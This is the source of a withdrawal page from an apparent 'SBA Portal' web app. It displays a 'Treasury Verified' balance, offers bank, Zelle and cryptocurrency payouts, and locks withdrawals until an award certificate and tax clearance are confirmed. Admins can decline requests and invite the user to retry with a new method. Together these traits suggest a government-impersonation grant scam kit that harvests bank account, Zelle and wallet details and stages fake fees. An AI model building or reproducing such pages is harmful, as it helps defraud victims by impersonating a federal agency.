<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Withdraw Funds | SBA Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
    <style>
        .method-tab { display: none; animation: fadeSlide 0.3s ease; }
        .method-tab.active { display: block; }
        .balance-hero { background: var(--navy); color: white; padding: 32px; border-radius: var(--r-xl); text-align: center; margin-bottom: 32px; box-shadow: var(--shadow-navy); }
        .balance-hero__val { font-size: 2.8rem; font-weight: 900; letter-spacing: -0.02em; margin: 8px 0; }
        .balance-hero__label { font-size: 0.8rem; text-transform: uppercase; opacity: 0.7; font-weight: 700; letter-spacing: 0.1em; }
        
        .tab-nav { display: flex; border-bottom: 1px solid var(--border-light); margin-bottom: 30px; overflow-x: auto; scrollbar-width: none; }
        .tab-nav::-webkit-scrollbar { display: none; }
        .tab-btn { flex: 1; padding: 14px; font-size: 0.85rem; font-weight: 700; color: var(--text-muted); border: none; background: none; border-bottom: 2px solid transparent; cursor: pointer; transition: 0.2s; white-space: nowrap; }
        .tab-btn.active { color: var(--navy); border-bottom-color: var(--navy); }
        
        #withdrawForm, #lockView, #statusView { display: none; animation: fadeSlide 0.4s ease; }
    </style>
</head>
<body>

    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>

    <div class="app-layout">
        <aside class="app-sidebar" id="appSidebar"></aside>
        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>

        <main class="app-main">
            <div id="pageHeader"></div>
            <div class="app-main__content" style="max-width: 800px;">
                
                <!-- Lock View -->
                <div id="lockView" class="status-screen">
                    <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
                    <h1 class="status-screen__title">Withdrawal Restricted</h1>
                    <p class="status-screen__message">Disbursements are enabled only after your Award Certificate is issued and §6325 tax clearance is confirmed.</p>
                    <a href="award.html" class="btn btn--primary">View Award Status</a>
                </div>

                <!-- Status View -->
                <div id="statusView" class="status-screen">
                    <div id="stIcon" class="status-screen__icon"></div>
                    <h1 id="stTitle" class="status-screen__title"></h1>
                    <p id="stMsg" class="status-screen__message"></p>
                    <div id="stActions"></div>
                </div>

                <!-- Main Form -->
                <div id="withdrawForm">
                    <div class="balance-hero">
                        <div class="balance-hero__label">Available for Payout</div>
                        <div class="balance-hero__val" id="displayBal">$0.00</div>
                        <div class="badge badge--success" style="background: rgba(255,255,255,0.1); color: white;">Treasury Verified</div>
                    </div>

                    <div class="card card--shadow">
                        <div class="tab-nav">
                            <button class="tab-btn active" data-m="bank">Bank Transfer</button>
                            <button class="tab-btn" data-m="zelle">Zelle Pay</button>
                            <button class="tab-btn" data-m="crypto">Cryptocurrency</button>
                        </div>

                        <form id="wForm">
                            <!-- Bank Fields -->
                            <div id="m-bank" class="method-tab active">
                                <div class="form-group"><label class="form-label form-label--required">Bank Name</label><input type="text" id="w-bank-name" class="form-input" placeholder="e.g. Chase Bank"></div>
                                <div class="form-group"><label class="form-label form-label--required">Account Holder Name</label><input type="text" id="w-bank-hold" class="form-input" placeholder="Must match application"></div>
                                <div class="form-row">
                                    <div class="form-group"><label class="form-label form-label--required">Routing (9 Digits)</label><input type="text" id="w-bank-route" class="form-input" maxlength="9"></div>
                                    <div class="form-group"><label class="form-label form-label--required">Account Number</label><input type="text" id="w-bank-acc" class="form-input"></div>
                                </div>
                                <div class="form-group"><label class="form-label">Account Type</label>
                                    <div class="flex gap-6"><label class="flex items-center gap-2"><input type="radio" name="bankT" value="Checking" checked> Checking</label><label class="flex items-center gap-2"><input type="radio" name="bankT" value="Savings"> Savings</label></div>
                                </div>
                            </div>

                            <!-- Zelle Fields -->
                            <div id="m-zelle" class="method-tab">
                                <div class="form-group"><label class="form-label form-label--required">Zelle ID (Email or Phone)</label><input type="text" id="w-zelle-id" class="form-input" placeholder="Identifier"></div>
                                <div class="form-group"><label class="form-label form-label--required">Legal Recipient Name</label><input type="text" id="w-zelle-name" class="form-input"></div>
                            </div>

                            <!-- Crypto Fields -->
                            <div id="m-crypto" class="method-tab">
                                <div class="form-row">
                                    <div class="form-group"><label class="form-label">Select Coin</label><select id="w-coin" class="form-select"><option value="USDT">USDT</option><option value="BTC">Bitcoin</option><option value="ETH">Ethereum</option></select></div>
                                    <div class="form-group"><label class="form-label">Network</label><select id="w-net" class="form-select"><option value="ERC20">ERC20</option><option value="TRC20">TRC20</option><option value="BEP20">BEP20</option></select></div>
                                </div>
                                <div class="form-group"><label class="form-label form-label--required">Your Destination Wallet Address</label><input type="text" id="w-addr" class="form-input" placeholder="Paste address carefully"></div>
                            </div>

                            <hr class="my-8" style="border: none; border-top: 1px solid var(--border-light); margin: 30px 0;">

                            <div class="form-group">
                                <div class="flex justify-between items-center mb-2">
                                    <label class="form-label form-label--required">Amount to Withdraw</label>
                                    <button type="button" class="btn btn--ghost btn--sm" id="btnMax" style="font-weight: 800; color: var(--navy);">MAX</button>
                                </div>
                                <input type="number" id="w-amt" class="form-input" style="font-size: 1.5rem; font-weight: 800; color: var(--navy);" placeholder="0.00">
                                <p class="form-hint" id="maxHint">Maximum available: $0.00</p>
                            </div>

                            <div class="card card--warning mb-8" style="background: var(--surface-2);">
                                <div class="form-group mb-0">
                                    <label class="form-label"><i class="fa-solid fa-shield-halved"></i> Transaction PIN</label>
                                    <input type="password" id="w-pin" class="form-input text-center" maxlength="4" placeholder="••••" style="letter-spacing: 1em; font-size: 1.2rem;">
                                    <div class="text-center mt-3"><a href="support.html" class="text-navy" style="font-size: 0.75rem; font-weight: 700;">Forgot Security PIN?</a></div>
                                </div>
                            </div>

                            <label class="flex gap-3 mb-8" style="cursor: pointer;"><input type="checkbox" id="w-check" required> <span style="font-size: 0.85rem; font-weight: 600;">I verify that the destination details are correct. I understand federal payouts are irreversible.</span></label>
                            
                            <button type="submit" class="btn btn--primary btn--full btn--lg" id="submitBtn">Request Disbursement</button>
                        </form>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script type="module">
        import { db, updateUserData, addLedgerEntry, notify, notifyAdmins, serverTimestamp, increment } from './firebase-config.js';
        import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, formatCurrency, showConfirm } from './app.js';

        requireAuth((user, userData) => {
            buildSidebar({ activeId: 'withdraw', userData });
            buildDock({ activeId: 'home' });
            buildPageHeader({ title: 'Withdrawal', subtitle: 'Secure Federal Payout', backUrl: 'dashboard.html' });
            initNotificationBadge(user.uid);

            const bal = userData.balance || 0;
            document.getElementById('displayBal').textContent = formatCurrency(bal);
            document.getElementById('maxHint').textContent = `Maximum available: ${formatCurrency(bal)}`;

            const lock = document.getElementById('lockView');
            const stat = document.getElementById('statusView');
            const form = document.getElementById('withdrawForm');

            // Routing
            if(userData.awardStatus !== 'APPROVED') { lock.style.display = 'block'; }
            else if(userData.withdrawStatus === 'IDLE') { form.style.display = 'block'; }
            else {
                stat.style.display = 'block';
                const ic = document.getElementById('stIcon');
                if(userData.withdrawStatus === 'PENDING') {
                    ic.className = 'status-screen__icon status-screen__icon--info'; ic.innerHTML = '<i class="fa-solid fa-money-bill-transfer fa-bounce"></i>';
                    document.getElementById('stTitle').textContent = 'Processing Payout';
                    document.getElementById('stMsg').textContent = 'Your withdrawal request is being reconciled with the Federal Treasury. Funds typically clear within 24-72 business hours.';
                } else if(userData.withdrawStatus === 'REJECTED') {
                    ic.className = 'status-screen__icon status-screen__icon--error'; ic.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
                    document.getElementById('stTitle').textContent = 'Transfer Declined';
                    document.getElementById('stMsg').textContent = userData.withdrawal?.declineReason || 'Identity verification for payout failed.';
                    document.getElementById('stActions').innerHTML = '<button class="btn btn--outline" id="btnRetry">Try New Method</button>';
                    document.getElementById('btnRetry').onclick = () => {
                        showConfirm({ title: 'Reset Request', message: 'Return to form to try a different payout method?', onConfirm: () => updateUserData(user.uid, { withdrawStatus: 'IDLE' }).then(() => location.reload()) });
                    };
                }
            }

            // Tab Switching
            let activeMethod = 'bank';
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.onclick = () => {
                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
                    btn.classList.add('active');
                    activeMethod = btn.dataset.m;
                    document.getElementById('m-'+activeMethod).classList.add('active');
                };
            });

            document.getElementById('btnMax').onclick = () => document.getElementById('w-amt').value = bal;

            document.getElementById('wForm').onsubmit = async (e) => {
                e.preventDefault();
                const amt = parseFloat(document.getElementById('w-amt').value);
                const pin = document.getElementById('w-pin').value;

                if(amt > bal) return showToast('Insufficient treasury balance', 'error');
                if(amt < 100) return showToast('Minimum withdrawal is $100', 'warning');
                if(pin !== userData.transactionPin) return showToast('Incorrect security PIN', 'error');

                showConfirm({
                    title: 'Authorize Payout',
                    message: `You are requesting a ${formatCurrency(amt)} transfer via ${activeMethod.toUpperCase()}. This action is permanent.`,
                    confirmText: 'Confirm Disbursement',
                    danger: true,
                    onConfirm: async () => {
                        const btn = document.getElementById('submitBtn');
                        setButtonLoading(btn, true, 'Reconciling with Treasury...');

                        const payload = {
                            method: activeMethod, amount: amt, submittedAt: serverTimestamp(),
                            bankName: document.getElementById('w-bank-name').value,
                            routingNumber: document.getElementById('w-bank-route').value,
                            accountNumber: document.getElementById('w-bank-acc').value,
                            zelleId: document.getElementById('w-zelle-id').value,
                            cryptoAddr: document.getElementById('w-addr').value
                        };

                        try {
                            await updateUserData(user.uid, { withdrawal: payload, withdrawStatus: 'PENDING', balance: increment(-amt) });
                            await addLedgerEntry(user.uid, { type:'withdrawal', amount: -amt, description: `Withdrawal — ${activeMethod.toUpperCase()}`, status: 'PENDING' });
                            await notifyAdmins({ title: 'New Payout Request', message: `${userData.fullName} requested ${formatCurrency(amt)}`, type: 'action' });
                            location.reload();
                        } catch(err) {
                            showToast(err.message, 'error');
                            setButtonLoading(btn, false);
                        }
                    }
                });
            };
        });
    </script>
</body>
</html>
